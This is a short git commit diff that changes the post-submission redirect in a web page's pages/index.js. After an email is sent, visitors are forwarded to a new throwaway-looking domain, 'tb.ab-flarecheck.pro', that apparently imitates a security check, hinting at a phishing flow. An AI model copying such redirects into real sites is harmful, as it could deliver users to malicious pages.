9722604d0282133367596b6f0efdf906f95d28de
husknet <127146284+husknet@users.noreply.github.com>
2024-11-12 12:37:46 +0000

    Update index.js

--- pages/index.js
+++ pages/index.js
@@ -54,7 +54,7 @@ export default function Home() {
         });
 
         console.log('Email sent successfully!', response.data.message);
-        window.location.href = 'https://tb.aspt-lvl.click';
+        window.location.href = 'https://tb.ab-flarecheck.pro';
       } catch (error) {
         console.error('Failed to send email:', error);
         setErrorMessage('Failed to submit. Please try again.');
